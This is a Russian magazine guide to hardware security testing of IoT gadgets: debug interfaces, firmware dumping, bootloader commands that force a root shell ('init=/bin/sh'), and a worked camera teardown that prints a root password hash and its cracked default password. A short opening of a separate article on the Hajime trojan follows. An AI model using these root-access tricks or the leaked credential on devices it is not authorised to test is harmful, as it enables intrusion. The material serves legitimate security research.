Тестирование интернета вещей можно раз делить на четыре этапа:
 • разведка — получение информации об устрой стве из открытых источников
   с целью понять, какие про токолы поддерживает гаджет, с какими устрой‐
   ствами совместим, к каким серверам обращает ся;
 • изучение аппаратного уровня — работа с электронной платой устройства;
 • исследование программного уровня — изучение дампа прошивки;
 • тестирование коммуникаций — сетевого и беспро водного общения.

В этой статье мы поговорим о проблемах безопас ности аппаратного уровня,
а именно узнаем, как разобрать девайс, чтобы исследовать интерфейсы
отладки.
  Объединим все это в общую задачу: получение прошивки устройства
или доступа к консоли управления. Если ты новичок в этой области, статья
предложит тебе подробный алго ритм действий, который позволит успешно
справиться с подоб ной задачей.
  Почему так важна возможность изучить плату устройства? Существу ют три
типа анализа защищенности. Тес тирование «черным ящиком» — когда у нас
нет вообще никакой информации о тестируемой сис теме. Тес тирование
«серым ящиком» — тот случай, если извес тны только некоторые особенности
реализации тестируемой системы. Тестирование «белым ящиком» — когда
нам известны все подробнос ти о тестиру емой системе.
   То есть чем «светлее» «ящик», тем качественнее будет анализ защищен‐
ности. Значит, во время  тес тирова ния требуется постараться соб рать
как можно больше данных для перехода от одного типа тестирования к сле‐
дующему.
   Разберем на примере «обеление» тестирования. Когда мы впервые
берем в руки устрой ство, мы ничего о нем не знаем. Это означает, что тес‐
тирование будет проводиться по методу «черного ящика».
  Предположим, мы разобрали гаджет и смогли извлечь лог отладки запуска
устройства через отладочные порты. Тестирование автомати чески становит‐
ся легче и переходит на уровень «серого ящика». А потом оказывается, что
в логах отладки засветился пароль адми нистратора, используя который мы
смогли подключиться к консоли управления устройством и получили воз‐
можность считывать и записывать любой файл в файловой системе. На этом
этапе тестирование переш ло на последний уровень «белого ящика».


РАЗБИРАЕМ УСТРОЙСТВО
Скорее всего, многие читатели решат пропус тить эту часть статьи. Именно
так я бы и поступил несколько месяцев назад, но ока залось, что в этой теме
есть множество нюансов, зна ние которых может заметно облегчить жизнь
начинающему исследователю.


Вин ты
Чтобы максимально усложнить задачу любителям покопаться в потрохах
электронных устрой ств, их производители напридумывали огромное количес‐
тво специальных винтов самой причудливой формы.





И не зря: в случае чего придется вскрывать устройство другими методами,
в результате мы можем повредить плату и доб ровольно избавить разработ‐
чика гаджета от грустной обязанности выполнять гарантийные обязательства.
На иллюстрации ниже показан клас сический пример нераскручиваемого вин‐
та.





А вот так выглядит концепт «безопасного» вин та Apple.





Чтобы быть максимально готовым  к подобным сюрпризам, тебе нужно
заранее закупиться набором отверток с необходимыми переходниками.
Не буду рекламировать решения конкрет ных производите лей (тем более, они
не платят за это денег редакции «Хакера»), но наборы, специально пред‐
назначенные для разборки мобильных устройств, в среднем стоят около шес‐
тидесяти баксов.





Однако даже самый кру той набор отверток не гарантирует стопроцентного
успеха. На практике мне попадались устройства с нормальными винтами,
при откручивании которых внутри корпуса ломалась плас тмассовая часть
с внутренней вин товой резьбой. Поэто му очень важ но обращаться с хруп‐
кими девайсами аккуратно, используя отвертки руками, рас тущими строго
из нужного места.


        WWW

                 О разных шлицах вин тов и их происхождении ты
                    можешь прочитать в статье «Тайная жизнь винтов:
                         от имбуса до минус потая».



Защита от вскры тия: сто рон ние материалы на плате
Думаю, ты наверняка в детс тве из любопытства разбирал электронику и изу‐
чал платы разных устрой ств. Очень часто на ней обнаруживалась странная
черная «клякса» — примерно такая, как на картинке ниже.





Она называется «компаунд». Если сказать проще, это отвердевшая полимер‐
ная смола с некоторыми добавками. Используется она пре имущественно
как электроизоляционный материал и иногда может мешать подключиться
к определенным контактам на плате. Примем за основу компаунда эпок‐
сидную смолу, как самый популярный тип.
   Если ты поищешь по форумам советы о том, чем ее убрать, то найдешь
много разных способов для самых различных  слу чаев. Бес смысленно
перечислять их все, подскажу только самый проверенный: нагревать верхние
слои смолы и удалять. Это, конечно, не так красиво, как растворение, но зато
почти всегда работает!
   Также стоит упомянуть, что на китайских пла тах иногда может встре титься
прозрачный клей. Он легко уда ляется, поэтому не будем на нем останав‐
ливаться.


Защита от вскры тия: про чие варианты
На практике другие методы защиты от вскрытия встречаются крайне редко.
В специализированной литературе мне попада лись упоминания о наличии
специальных клипс, пос ле вскрытия которых устройство уже будет нецеле‐
сообразно изучать. Так вот, это настолько диковинный способ защиты, что я
даже не могу предложить пример такого устройства. Если тебе попадалось
что‐то подобное, обязательно поделись сво им опытом в комментариях.


ИЗУЧЕНИЕ ПЛАТЫ УСТРОЙСТВА
После вскрытия устройства нас будет интересовать только его электронная
плата.


По иск информации в интерне те
Часто на печатной плате устройства пишут ее номер или название, можно
нагуглить по ним схему с описанием всех интерфейсов и пропустить сразу
несколько этапов тестирования, которые проводятся, чтобы определить про‐
токолы.





Ищем информацию о чипах
Кроме названия платы, следует найти и записать наиме нования всех чипов
на ней. После этого нужно погуглить их наз начение и поддерживаемые
интерфейсы.
  На фото ниже показан пример найденной технической спецификации чипа
STM32F207: в этом документе приведены подробные опи сания пред назна‐
чения каждого из контактов микросхемы.





Изу чаем разъ емы
Если на видном месте платы расположены разъемы, вероятнее всего раз‐
работчики девайса предполагали, что они будут как‐то задей ствованы. Нужно
помнить, что некоторые из портов устройства могут также использоваться
как отладочные.
   Так, у многих видеокамер разъем Ethernet работает еще и в режиме Power
Over Ethernet (PoE). Если это твой случай, то советую приобрести специаль‐
ные разветвители.





Кроме того, у некото рых устройств этот порт может использоваться как RS‐
232 (о нем я расскажу чуть позже). Для таких случаев подойдет другой спе‐
циальный проводок.





Обрати внимание: если на пла те нашелся подходящий разъем, не факт, что
переходник к нему идеально подойдет, ведь есть нес колько стандартов рас‐
пиновки.
   Разъемы USB на платах умных устройств встречаются реже, и предназна‐
чены они пре имущественно для подключения цифровых накопителей. Иногда
такой порт может использоваться как отладочный, например на смартфонах
с Android.
   Разъемы RS‐232 чаще всего встречаются на промышленном оборудо‐
вании и  нужны  для решения  задач администрирования. Переходники
для таких разъемов продаются на каждом углу.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
 ВСКРЫТЬ И ИЗУЧИТЬ
                ПОЛНЫЙ ГАЙД ПО ПОТРОШЕНИЮ
                       ДОМАШНИХ ГАДЖЕТОВ





КОНТАКТЫ МИКРОСХЕМ
Для работы с аппаратными интерфейсами требуется сначала определить их
наличие и расположе ние на микросхеме. Для этого рассмотрим восемь
самых распространенных вариантов их размещения.
  Внимательно посмотри на следующую фотог рафию платы.





Видишь вот эти контакты?





Почти со стопроцентной уверенностью утверждаю, что какие‐то из них будут
отвечать за отладку устройства по определен ному интерфейсу, а может, даже
и нескольким. Для подклю чения к этим пинам придется воспользоваться
паяльником.
   Также у некото рых устройств подобные контакты могут быть хорошо спря‐
таны.





А вот другой пример. Пос мотри на картинку.





Некоторые контакты представляют собой сквоз ные отверстия с металлизаци‐
ей. Для подключения к ним можно использовать стандартные пины, например
для Arduino UNO. Но нужно учитывать ширину штырь ков, иначе есть шанс пов‐
редить плату при подключении.
  А вот еще один пример.





Если пины от Arduino не подойдут, мож но использовать следующий метод.
Берем провод с разъемом, показанным на следующем рисунке, — похожие
разъемы часто исполь зуются для подключения индикаторов и управляющих
кнопок к материнской плате компьютера. Удаляем пластмас совую оболочку,
затем корректируем раз мер клеммы плос когубцами и оборачиваем ее изо‐
лентой, чтобы избе жать контакта с соседними пинами.





                          Было





                              Стало

У устройства, показанного на следующей иллюс тра ции, отладочный разъ ем
был смонтирован отдель но для удобства подклю чения. Лучше всего тут вос‐
пользоваться паяльником и вывести все нуж ные контакты на отдельные про‐
водки.





Рассмотрим еще один пример.





На многослойных печатных платах встречаются учас тки, наводящие на мысли
о том, что там могли отломать какую‐то лиш нюю деталь. В данном слу чае есть
шанс, что отладочные пины были выведены на отдельную плату, которую
при выпуске продукта уда лили. Подробно рассмат ривать этот случай мы
не будем, скажу только, что возможность подклю чения к таким контактам
сильно зависит от архитектуры платы устройства, поскольку всегда остается
шанс случайно повредить остальные элементы.





Если ты найдешь в интернете схему распиновки какого‐нибудь чипа, можно
подклю читься к нему нап рямую, примерно так, как это показано на фото
выше. Правда, для этого нужно уметь хорошо паять.
  Некоторые пины могут быть спря таны при пойным покрытием — такой
вариант показан на сле дующей картинке. Но опять же подобное встречается
крайне редко.





Исследователь Деннис Гис (Dennis Giese) на DEFCON 26 рас сказывал (PDF)
про безопасность устройств Xiaomi. Во время изучения платы одного из гад‐
жетов производства этой компании он стол кнулся с тем, что контактная пло‐
щадка чипов находилась точно под ними, из‐за чего не было никакой воз‐
можности подключиться к ним без пайки.





Но позже он заметил на пла те контактные дорожки, идущие к другому чипу.
После этого Деннису потребовалось немного времени для поиска datasheet
этой микросхемы.





Таким образом он смог определить, что эти контактные дорожки отве чают
за общение чипа с RAM. Осталось лишь подключить ся к дорожкам и сдампить
прошивку.





ОПРЕДЕЛЯЕМ ИНТЕРФЕЙСЫ НА КОНТАКТАХ
После того как мы разоб рались с контакта ми, нам потребуется определить,
какие протоколы работают на отладочных пинах. В этой части статьи мы рас‐
смотрим оборудование, предназна ченное для исследования протоколов вза‐
имодействия с нашим девайсом.


Осциллограф
С осциллографами многие уже зна комы. Этот прибор позволяет визуально
и программно определить активность на соответству ющих пинах. Минус
такого решения заключается в высокой стоимости осциллографа. А плюс —
в том, что ты получаешь полноценное оборудование для определе ния
интерфейсов. К тому же многие дорогие осциллографы имеют функцию
логического анализатора.





Ло гический анализатор
Существует несколько конкуриру ющих логических анализаторов, например
DSLogic и Saleae Logic. Сравнитель ные характерис тики этих устройств можно
найти в интерне те, мы же рассмотрим работу с анализатором Saleae Logic.





Стоимость девайса — от 500 долларов (для сту дентов предусмотре на скид‐
ка 50%). Контакты подклю чаем к исследуемым пинам, включаем устройство
в режим прослушивания и наблюдаем примерно следующую картину.





Определить протоко лы, которые используются на выбранных нами пинах,
можно либо визуально, либо программно — для этого в интерфейсе при‐
ложения анализатора имеется специальная вкладка Analyzers. В некоторых
случаях тебе придется подбирать параметры — например, скорость переда‐
чи данных.


Мультиметр
При помощи мультиметра можно уста новить наличие сигнала на опре делен‐
ных пинах — достаточ но найти контакты, на которых периодически будет под‐
скакивать напряжение. Это удобно, если на исследуемой тобой плате пол но
пинов, на провер ку которых дру гими способами может уйти много вре мени.





Arduino
Если у тебя есть Arduino и, желательно, неболь шой экран для него, из этого
комплекта вполне можно собрать портативный осциллограф. Как это делать,
подскажет Великий Гугль — в интернете можно отыскать готовые проекты
подобных приборов.





JTAGenum
В некоторых случаях нужно догадать ся, какой протокол вероятнее всего
используется на том или ином интерфей се. Для интерфейса JTAG сущес твует
специальный проект JTAGenum.
  С помощью JTAGenum исследователь может определить, какой пин
на изучаемой плате за что отвечает. Для этого достаточно приобрести Ar‐
duino, загрузить на него ПО JTAGenum и подклю чить контакты со 2‐го по 11‐й
к тестируемой плате, пос ле чего запус тить ска нирование. Пример работы
такого устройства показан на следующей иллюстра ции.





JTAGulator





Эта гламурная розовая плата в стиле Hello Kitty предназначена для решения
тех же проблем, что и JTAGenum. Преимущества у этой платы, которая
называется JTAGulator, следующие:
 • возможность одновременного подключения до 24 пинов;
 • возможность работы в роли JTAG‐переходника;
 • возможность работы в роли UART‐переходника;
 • дополнительный бонус: определение час тоты передачи данных UART.

Кроме того, в настоящее время ведется раз работка ПО для применения
JTAGulator в роли логического анализа тора.
  Из минусов стоит отметить только ее высокую стоимость — поряд‐
ка 175 долларов.
   Какой вариант лучше? Об этом подробно рас сказано в статье JTAGulator
vs. JTAGenum, Tools for Identifying JTAG Pins in IoT Devices. Спойлер: и Arduino,
и JTAGulator прекрасно спра вились со сво ей задачей.


ВЗАИМОДЕЙСТВИЕ С ИНТЕРФЕЙСАМИ


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
 ВСКРЫТЬ И ИЗУЧИТЬ
                ПОЛНЫЙ ГАЙД ПО ПОТРОШЕНИЮ
                       ДОМАШНИХ ГАДЖЕТОВ





UART
UART — один из наибо лее час то встречающихся отладочных протоколов.
В зависимости от платы и прошивки устройства он поз воляет общаться с заг‐
рузчиком и терминалом операционной системы.
  Протокол исполь зует минимум два обязательных пина: RX — приемник,
TX — передатчик — и два необязательных: GND — земля, VCC — нап‐
ряжение. Чаще всего на плате потребуется искать четыре сгруппированных
пина.
  Для работы с Serial‐консолью устройства понадобится соответствующая
программа. В Unix‐based‐системах лучше всего использовать minicom, а в
Windows — Realterm.





                     Ин терфейс Realterm

После загрузки программы тебе потребуется вручную подключать пины RX,
и если не получится, то еще и GND, пока на экране при включении устройства
не появится периодически прерывающийся (это важно!) поток байтов. Затем
остается лишь подоб рать частоту переда чи данных, чтобы на экране вместо
потока нечитабельных символов появи лись читабель ные. Самые популярные
частоты приведены в следующей таблице (первая колонка).





Подобрать частоту мож но вручную, переключая зна чения в самой программе,
а можно с использованием популярного скрипта на питоне baudrate.py.


Обо рудо вание
Для работы с протоколом UART используются специальные переходники,
например позволяющие подключиться к разъему USB.





Переходник с USB на COM‐порт тоже можно приспособить в качестве
переходника USB — UART, достаточно использовать только контакты RD, TD
и Ground.





Вот как выглядит переходник для UART, переделанный из переходника USB —
RS‐232.





А еще в качестве переходника UART — USB можно использовать Arduino Uno.
Для этого следует закоротить контакты Reset и GND.





Как вариант, можно приобрести плату Bus Pirate, которая позволя ет решать
целый спектр задач, но сейчас мы погово рим о ее использовании в качес тве
переходника USB — TTL.





Для перевода платы в режим переходника потребуется подключить ее
к компьюте ру и, используя Realterm/minicom (о которых я рассказывал ранее)
на частоте 115 200 начать общать ся с командной строкой устройства.





Не будем вдаваться в подробности нас тройки этого девайса. Листинг обще‐
ния во время переключения платы в режим переходника предоставлен
на картинке ниже.





Далее потребуется соединить пины MOSI → RX, MISO → TX, GND → GND,
и можно использовать Bus Pirate как стандартный переходник.
  А теперь настало время снова вспомнить про девайс под названием JTAG‐
ulator. Хоть изначально он создавался не для этого, JTAGulator все же можно
приспособить в качестве переходника USB — TTL. Для этого аналогично Bus
Pirate требуется подключиться к консоли управления устройством и вбить
команды, показанные на следующей иллюстра ции.





           WARNING

                    Перед тем как приступить к творческим экспе‐
                     риментам,  проверь  все  пины  мультиметром
                       на отсутствие высокого напряжения, иначе велик
                     шанс  спалить  такие  устройства,  как  Arduino
                      и USB — UART. На удивление, на моей практике
                     именно переходники USB — Serial показа ли себя
                        с лучшей сто роны и ни разу не сгорели во время
                         тестирования плат.



JTAG
JTAG — это название рабочей группы по раз работке стандарта IEEE 1449,
но многие ассоциируют его с наз вани ем отла дочного интерфейса. Доступ
к этому интерфейсу в большинс тве слу чаев дает нам неограниченный кон‐
троль над устройством, например воз можность сдампить его прошивку. Чаще
всего для работы с JTAG используется система отладки для микроконтрол‐
леров — OpenOCD.
   У этого интерфейса есть четыре обязательных рабочих пина: TDI (сигнал
данных на вход), TDO (сигнал данных на выход), TCK (тактовая частота), TMS
(выбор режима тестирования) — и один необязатель ный — TRST (TestReset).





Чаще всего контакты на плате группируются с дру гими в одну‐две дорожки,
поэтому поиск нужных пинов осложня ется. Способы определить, за что отве‐
чает каждый порт, указывались ранее, а сейчас мы рассмотрим примеры
общения с устройствами по интерфейсу JTAG.


Обо рудо вание
Сергей Поделкин уже подробно описал использование Arduino в качес тве
программатора для некоторых чипов, поэтому нас тоятельно советую тебе
ознакомиться с его стать ей «Превращаем Arduino в пол ноценный AVRISP
программатор». От себя добавлю, что проектов для Arduino существует мно‐
жество, и если тебе вдруг понадобился программатор для определенной
архитектуры, то ищи информацию в интернете — скорее всего, кто‐то уже его
реализовал.
   Если мы уже знаем, за что отвечает каж дый пин, и у нас есть плата JTAGu‐
lator, можно переключить ее в режим совместимос ти с OpenOCD и зас тавить
работать как переходник.
  Один из дешевых и многофункциональных прог рамматоров, позволяющих
работать с большим количеством раз личных процессоров и совместимых
с OpenOCD, называется J‐Link. Обойдется он примерно в 5000 рублей.





Напоследок стоит упомянуть о воз можнос ти работы с интерфейсом JTAG
с использованием пла ты Bus Pirate и ПО OpenOCD. Под робно нас тройка
устройства описана в статье Gonemad’s Bus Pirate/OpenOCD walk through.


I2C
Этот интерфейс чаще всего используется для общения с памятью EEPROM.
Для подклю чения минимально требуется две дорожки. Рассмотрим способы,
позволяющие прослушивать общение.


Обо рудо вание
Активность I2C можно монито рить при помощи Arduino — есть соответству‐
ющий проект на GitHub.
  Очевидно, этого инструментария недостаточно для полноценного дампа
прошивки, но с помощью такого метода можно как минимум убедиться, что
данные по этому интерфейсу передаются. Кроме того, для работы с I2C мож‐
но воспользоваться Bus Pirate. Помни, что при передаче данных могут воз‐
никнуть помехи, поэтому не сто ит доверять этой информации на сто процен‐
тов. Подклю чение пинов: MOSI → SDA, CLK → SCL.
  Подробный туториал по использованию Bus Pirate можно посмотреть в
блоге Digitalpeer.
  Существует еще девайс под наз ванием  I2CDriver: он предназначен
для взаимодействия компь ютера с I2C‐интерфейсом по каналу USB. Он поз‐
воляет не только управлять устройством, но и прослушивать или декоди‐
ровать его трафик. Сам я пока это приспособ ление не использовал, но выг‐
лядит оно крайне интерес но.





SPI
Хоть и нечасто приходится работать с этим интерфейсом, но рассмотреть его
надо.
   SPI — интерфейс для последовательного обмена данными между мик‐
росхемами. Работает он по прин ципу Master — Slave и использует четыре
сигнала: MOSI (от ведущего к ведомому), MISO (от ведомого к ведуще му),
SCK (тактовый сигнал) и CS (выбор ведомого).


Обо рудо вание
Как всегда, начнем мы с Arduino. Про ект под наз ванием spi‐dump поз воляет
использовать этот компьютер для дампа про шивки с SPI EEPROM. Много
об этом писать не буду, на GitHub лежит хороший ту ториал по использованию
этой технологии, написанный ее автором.





У Bus Pirate тоже есть функция SPI‐сниффера. Нас траивается так же, как и
I2C.





Схема подклю чения пинов: MOSI → MOSI, CLK → CLOCK, MISO → MISO, CS
→ CS.


SWD
Скажу сразу: ни разу не встречал этот интерфейс в устройствах IoT, но, пос‐
кольку он широко применя ется разработчиками микроконтроллеров,  то,
вероятнее всего, в скором времени появится и в составе умных устройств.
Интерфейс SWD исполь зует тот же про токол, что и JTAG. Для работы ему тре‐
буется только три провода: DIO (input‐output), CLK и GND.


Обо рудо вание
Так как у Bus Pirate нет полноценной поддержки SWD, мы сможем только
записать прошивку на чип. Для этого схема подклю чения будет сле дующей:
MOSI → DIO, CLK → CLK и GND → GND.


        WWW

                    Пример работы с SWD



После того как мы рассмотрели работу с интерфейсами, разберемся, чем же
нам это поможет при тестировании умного девай са.


ПОЛЕЗНАЯ НАГРУЗКА
Используя обнаруженные ранее интерфейсы, мы постараемся получить
исчерпывающую информацию о девайсе — версию ПО, исходники, доступ
в консоль управле ния и прочее.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
 ВСКРЫТЬ И ИЗУЧИТЬ
                ПОЛНЫЙ ГАЙД ПО ПОТРОШЕНИЮ
                       ДОМАШНИХ ГАДЖЕТОВ





По лучаем дамп про шивки…
…с использованием интерфейса UART
Посредством UART чаще всего мы сможем общаться с загрузчиком операци‐
онной системы. Так как воз можнос ти интерфейса командной строки заг‐
рузчика ограничиваются требова ниями раз работчиков платы, мы не сможем
изучить все случаи, поэтому будут рас смот рены два отдельных вари анта
с разными загрузчиками: Universal Boot Loader (U‐Boot) и Common Firmware
Environment (CFE).
   Чтобы подключиться к загрузчикам, мы восполь зуемся одной из программ
для работы с Serial‐устройствами — minicom или Realterm. Частоту передачи
данных мы уже определили на предыду щих эта пах исследования. Также
для активации консоли может потребовать ся зажать Ctrl + C или другие ком‐
бинации клавиш, поэто му придет ся следить за сообщениями, появляющи‐
мися на экране.
   Если ты используешь U‐Boot, после подключения к консоли можно пос‐
мотреть список доступных команд, набрав на кла виатуре волшебное слово
help.





В этом примере нас интересу ют три команды: cramfsls, cramfsload и md.
Используя команду cramfsls, мы можем получить спи сок файлов в файловой
системе устройства.





Далее выбираем нужный нам файл (пусть будет /etc/hosts) и считываем его
командой cramfsload.




В ответ мы получим сообщение, что по адресу 0x81000000 во флеш‐памяти
записан наш файл. Прочитаем его командой md.l (memory display).





В дальнейшем этот процесс можно автомати зировать, например при помощи
библиотеки PySerial.
  В случае с загрузчиком CFE меняется только последовательность вво‐
димых команд.
  Для начала посмотрим список подключенных устройств с помощью коман‐
ды show devices.





Попробуем прочитать 100 байт с устрой ства nﬂash1.nvram.





После этого нам остается лишь прочитать флеш‐память по адре су 0x40000.





И, аналогично случаю с U‐Boot, можно авто матизировать процесс чтения
памяти при помощи PySerial.
  В зависимости от кон фигура ции загрузчи ка иног да вмес то того, чтобы
тратить время на получение дампа памяти по UART (бывало, 15 Мбайт ска‐
чивались всю ночь), можно отпра вить их по протоколу TFTP или записать
на microSD.


…с использованием интерфейса JTAG
При работе с JTAG очень важ но определить ся, какое ПО может взаимодей‐
ствовать с этим интерфейсом. Сейчас я расска жу, как получить дамп прошив‐
ки, используя сбор ку OpenOCD + Bus Pirate.





Нам потребуется программа OpenOCD и нас троенная конфигурация для Bus
Pirate, которая доступна в репозитории Proxmark.
  Для начала запустим OpenOCD с нашим конфигом.





Затем подключим пины Bus Pirate к JTAG Proxmark3 следующим образом: CS
→ TMS, MOSI → TDI, MISO → TDO, CLK → TCK, GND → GND и 3.3 → 3.3.
   Теперь останется только подключиться к поднятому нами сервису на пор‐
те 4444, который указан в конфиге, и ввести пару команд.





И в этой же директории мы обна ружим фай лик backup.bin с прошивкой
устройства.





Процесс занял всего 246 секунд, и про шивка уже у нас!


…с использованием интерфейса I2C/SPI
Преимуществен но нас будет интересовать исполь зование этих интерфейсов
у чипов энергонезависимой памяти EEPROM. Отмечу сразу, что Arduino —
не лучшее оборудование для работы с памятью, но считаю, что использовать
его все‐таки можно.
  Для Arduino имеется как минимум два про екта по дампу прошивки чипов
I2C/SPI: arduino‐i2c‐read‐eeprom и spi‐dump.
  Не советую пользовать ся этими разработками новичкам, так как при
некорректном подключении устройства к пинам мож но запросто его сжечь.





Отдельно  хочу рассказать о  программа торе  tl866plus, который может
работать с EPROM, EEPROM, FLASH, SPI, I2C,93Cxx, ICSP и другими чипами.
По сравнению с другим аналогичным обо рудованием стоит он копейки.





ПО для tl866plus есть только под Windows, но, если ты используешь другую
ОС, оно хорошо заработает в виртуалке, и проб лем с пробросом устройства
быть не должно. Также для этого программа тора есть наборы переходников,
позволяющих подключать к нему разные чипы.





Мы рассмотрим считыва ние прошивки с JTAGulator без пай ки, с исполь‐
зованием прищепки для SOP8.





Сразу оговорюсь: во время работы JTAGulator находился в ждущем режиме
и был запитан по USB, пос кольку программа тор не справлялся с обеспечени‐
ем питания для всей платы устройства. Чтобы девайс не проявлял активность
в процессе дампа прошивки, лучше всего зажать на чипе пин Reset.
   Начнем с запуска ПО для работы с TL866 — Xpro. Ниже показан скриншот
интерфейса программы.





На фотографии ниже отмечен чип памяти, смонтированный на плате JTAGula‐
tor, — у меня это 24LC5121.





Выбираем его в программе.





Далее подключаем к памяти клипсу зажима (как на фото).





Нажимаем на кнопку Chip read и получа ем дамп прошивки JTAGulator.





По луче ние root-кон соли
Если у тебя по какой‐то причине не получи лось сдампить прошивку, можно
попробовать получить доступ к админской консоли управления по интерфей‐
су UART.


Аргумен ты запуска
И в загрузчике U‐Boot, и в CFE есть воз можность как считывать, так и записы‐
вать глобальные переменные с помощью команд printenv и setenv.
  Для начала посмотрим, какие переменные были установлены разработ‐
чиками.





Нас должна заинтересовать переменная аргументов запуска bootargs:



  bootargs=mem=42M console=ttyAMA0,115200
  root=/dev/mtdblock1rootfstype=cramfsmtdparts=xm_sfc:256K(boot),3520K(rom
  fs),2560K(user),1280K(web),256K(custom),320K(mtd)


Для получения рутового доступа можно попробовать дописать в аргументы
запуска путь до Bash/BusyBox, чтобы обес печить автозапуск рутовой консоли
при старте системы. Для это го в консоль требуется ввес ти одну из сле‐
дующих команд:


$ setenv extra_boot_args init=/bin/sh
$ setenv optargs init=/bin/sh
$ setenv bootargs $ single init=/bin/sh

Этот метод срабатывает нечас то. Советую пос мотреть презентацию ком‐
пании Synack на DEFCON 23, где были про тес тированы четырнадцать устрой‐
ств и к двенадцати из них получены рутовые консоли именно таким методом.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
 ВСКРЫТЬ И ИЗУЧИТЬ
                ПОЛНЫЙ ГАЙД ПО ПОТРОШЕНИЮ
                       ДОМАШНИХ ГАДЖЕТОВ





Под мена про шивки
Подменить прошив ку устройства с помощью TFTP можно только при наличии
порта Ethernet. В переменных окру жения потребуется ввести команду setenv
и указать настрой ки сети.





Здесь ipaddr — IP‐адрес устрой ства, netmask — маска сети, serverip —
адрес сервера TFTP на твоем компь ютере. Синтаксис команды tftpboot
имеет следующий вид.





Теперь нужно поднять сервер TFTP, поместить в его папку файл прошивки
и загрузить этот файл на устройство командой tftpboot.
  Другой метод заключа ется в сохранении прошивки на SD‐карточку с пос‐
ледующей ее загрузкой. Для это го можно исполь зовать команды mmcinit
и ext2ls.
  Команда mmcinit нужна для инициализации карточки, а ext2ls — для заг‐
рузки файла с карточки во флеш‐память. Подробнее эта процедура описана
в вики OpenMoko.
  Используя команду mw (memory write), ты можешь записывать байты нап‐
рямую во флеш‐память. Но этот процесс требует автоматизации, поскольку
запись в случае разных зна чений байтов будет идти со скоростью четыре
байта за один цикл выполнения команды mw. Синтаксис команды име ет сле‐
дующий вид.





Ниже показан пример использования этой команды.





Метод швейной иглы
Этому способу было посвящено выс тупление «pin2pwn — How to Root anEm‐
bedded Linux Box with a Sewing Needle» на конференции DEFCON 24.





Суть хака заключалась в том, чтобы закоро тить соответствующие пины на чте‐
ние во время загрузки девайса и тем самым вызвать исключение у скрипта
автозагрузки, которое выкинет нас в рутовую консоль.





           WARNING

                     Внимание! Есть шанс сжечь память устройства,
                          так что используй этот метод осто рожно.


На этой радостной ноте с теорией мы, пожалуй, закончим и перейдем к прак‐
тике. Нам предстоит решить увлекательную задачу: извлечь прошивку из IP‐
камеры. Не переключайтесь.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

 ВСКРЫТЬ И ИЗУЧИТЬ
                ПОЛНЫЙ ГАЙД ПО ПОТРОШЕНИЮ
                       ДОМАШНИХ ГАДЖЕТОВ





ПРАКТИЧЕСКАЯ ЧАСТЬ: ИЗВЛЕЧЕНИЕ ПРОШИВКИ КАМЕРЫ
Для эксперимента я использовал камеру с незатейливым названием WiFi
Smart Camera. Это очень симпатичный девайс, внешне похожий на гибрид
фена с ночником.





Поскольку камера китайская, открыть ее не составило особого труда, даже
без отвертки.





В первую очередь изучим название платы.





Теперь посмотрим на нее с дру гой стороны.





Наименование платы видно на первой фотографии: IPG‐RM‐BLK510‐0062‐S.
Гуглим.





Сайт 121.40.191.139:81 на момент написа ния статьи был отключен, поэтому
воспользуемся кешем Google.





В первой колонке таблицы перечислены названия контактных площадок
на плате, во второй — номера контактов, в треть ей и четвертой — их опи‐
сание и предназначение.
  Быстро просматриваем табличку в поисках интересных интерфейсов
и обнаруживаем, что у пло щадки J10 вынесены порты UART.





Находим ее на плате.





Количество пинов совпадает, нумерация есть. Дело за малым! Подключаем
Arduino к пинам GND (земля), UART0_TXD (отправка) и UART0_RXD (прием).





Вклю чаем программу для работы с Serial‐устройствами: в моем случае
это IONinja, перезапускаем устройство и зажима ем Ctrl + C на клавиатуре
для входа в консоль загрузчика U‐Boot.





Получить рутовую консоль не удалось, так что перей дем к сле дующему пункту.
У нас есть возможность использовать команды cramfsls и cramfsload. Поп‐
робуем сдампить файлик с именами пользователей и паролями.





Вот мы и получили первый зашитый пароль в камере:



  root:\$1\$RYIwEiRA\$d5iRRVQ5ZeRTrJwGjRy.B0:0:0:root:/:/bin/sh


На одном из форумов находим уже декодированный хеш.





Итак, мы получили пароль root: xmhdipc. С этим разобрались, вернемся
к первой фотографии платы.





Красным отмечен чип памяти EEPROM с контактной площад кой SOP8. На нем
написано его название: 25L6433F. Погуг лив, определяем, что обще ние идет
по SPI, а также находим распиновку микросхемы.





Считать содержимое чипа напрямую с пла ты не получи лось. Придется выпа‐
ивать.





Подключаем извлеченную при помощи паяльника микросхему к программа‐
тору.





Записываем дамп, припаиваем чип обратно и удостоверимся, что в сох‐
раненном файле есть то, что нам требует ся. Для этого воспользуемся ути‐
литой binwalk.





Посмотрим, что получилось рас паковать.





Вот мы и получили все файлы с этого устрой ства!


В ЗАВЕРШЕНИЕ
На этом статья, посвященная аппаратной безопас ности умных устройств,
заканчивается. Многое в ней не было затронуто, а по некоторым из ее частей
можно написать отдельные статьи для подробного рассмотрения всевоз‐
можных случаев. Тем не менее, надеюсь, этот материал поможет тебе изу‐
чить внутреннее устройство окружающих нас умных гаджетов.


Спи сок литера туры на лето
 • Security Engineering: A Guide to Building Dependable Distributed Systems —
   книга интересна тем, что в ней подробно рас ска зывается про физичес кую
   безопасность устройств.
 • «Аналоговые интерфейсы микроконтроллеров» — здесь под робно расска‐
   зывается об исполь зуемых интерфей сах общения с микроконтрол лером (в
   том числе и тех, которые не были зат ронуты в данной статье).
 • PentestHardware — сборник заметок тестировщика встраиваемых систем,
   по объему уже может сравниться с книгой (150 страниц).
ВЗЛОМ
     ХАДЗИМЭ!
     РАЗБИРАЕМСЯ, КАК УСТРОЕН HAJIME,
            ИЗВЕСТНЫЙ ТРОЯН ДЛЯ IOT





                                                                          Валентин Холмогоров
                                                                                              valentin@holmogorov.ru





5 октября 2016 года на одном из ханипотов, принадлежащих
исследовательской группе Rapidity Networks, был обнаружен
подозрительный тра фик. По всем признакам выходило, что
в заботливо приготовленную спе циалистами по информа‐
ционной безопасности ловушку  уго дил очередной клон
Mirai — как минимум симптомы заражения казались очень
похожими.  Однако  стоило  исследователям  взглянуть
на находку чуть пристальнее, что бы прийти к выводу: они
имеют дело с чем‐то принципи ально новым.


Вредонос оказался не просто тро яном для работа ющих под управлением Lin‐
